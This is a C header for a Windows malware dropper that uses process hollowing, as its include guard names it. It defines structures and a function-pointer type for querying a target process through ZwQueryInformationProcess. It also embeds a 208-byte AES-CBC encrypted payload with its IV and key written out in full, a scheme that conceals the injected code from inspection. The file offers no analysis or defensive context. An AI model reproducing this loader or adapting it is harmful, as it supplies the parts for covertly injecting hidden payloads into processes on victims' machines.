#pragma once
#ifndef DROPPER_PROCESS_HOLLOWING_H
#define DROPPER_PROCESS_HOLLOWING_H

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

// Define NTSTATUS for ZwQueryInformationProcess
typedef LONG NTSTATUS;

// Structure for basic process information (manually defined)
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2;
    PVOID Reserved3;
    ULONG_PTR UniqueProcessId;
    PVOID Reserved4;
} PROCESS_BASIC_INFORMATION;

// Function pointer type for ZwQueryInformationProcess
typedef NTSTATUS(WINAPI* PFN_ZWQUERYINFORMATIONPROCESS)(
    HANDLE ProcessHandle,
    int ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

#define CREATE_SUSPENDED                0x4
#define PROCESS_BASIC_INFORMATION_CLASS 0 // Query class for basic information
#define ENCRYPTED_PAYLOAD_SIZE        208

// AES-CBC encrypted payload (with PKCS7 padding)
unsigned char encrypted_payload[ENCRYPTED_PAYLOAD_SIZE] =
"\x58\x74\xb5\x5b\x8f\xf3\x7e\x2f\x5e\x74\x34\x3d\xb6\x47\xa3\x7f"
"\xc7\xac\xc6\xe6\xd4\x56\x40\x0d\x2b\x6b\xf0\x0a\xf5\xf7\x34\xf6"
"\x30\x9e\xa0\x4d\x17\x64\xed\x2f\x06\x8f\xd9\x6d\x02\x87\xa3\xff"
"\xe0\x11\x15\x89\x48\x2a\x0d\xd4\xe2\x18\x1a\x24\x23\x7e\xbf\xdb"
"\x86\x59\x92\xa1\x44\x4f\xf7\xdf\x9b\x38\x0d\xb1\x8f\x36\x76\x33"
"\xab\xb7\xf2\x32\xcf\x41\xa1\xe3\x2d\xab\x03\x54\xce\x79\x4e\x7b"
"\x4d\x89\xff\x9d\x8e\x31\xe6\x29\xf0\x94\x2c\x30\x97\x72\xa5\x8e"
"\xe2\xc7\xfa\xe3\x04\xff\x78\x49\x50\x84\x4a\x11\x9e\xa1\xf6\x11"
"\x3d\xd1\xf2\x13\x54\xc1\x0e\x45\xfc\x61\x06\x7b\x91\xc0\x2f\x31"
"\x6a\x42\x96\x77\x08\xb8\x41\x50\x0b\xcf\x5c\x70\x8a\x7e\x3a\x0d"
"\xc5\xf2\xc5\xd5\x1b\x97\x2c\xe6\x73\x94\x8f\xa0\x27\xe7\x4a\xdb"
"\x8b\xff\x97\xde\x57\x2f\x4a\x6e\x82\xcb\x15\x77\xa3\xa4\x48\x40"
"\xbb\xf1\xc1\xd8\x72\xe8\x1c\x15\xf8\xe2\xd4\x34\x32\x07\xcf\xfd";

// AES IV and key
unsigned char iv[16] =
"\x63\x5a\xa4\x43\x6d\x9a\x27\x8a\xd3\x29\x6b\xdb\x6d\xe0\x8e\x29";
unsigned char key[32] =
"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff"
"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\xcc\xdd\xee\xff";

#ifdef __cplusplus
}
#endif

#endif // DROPPER_PROCESS_HOLLOWING_H

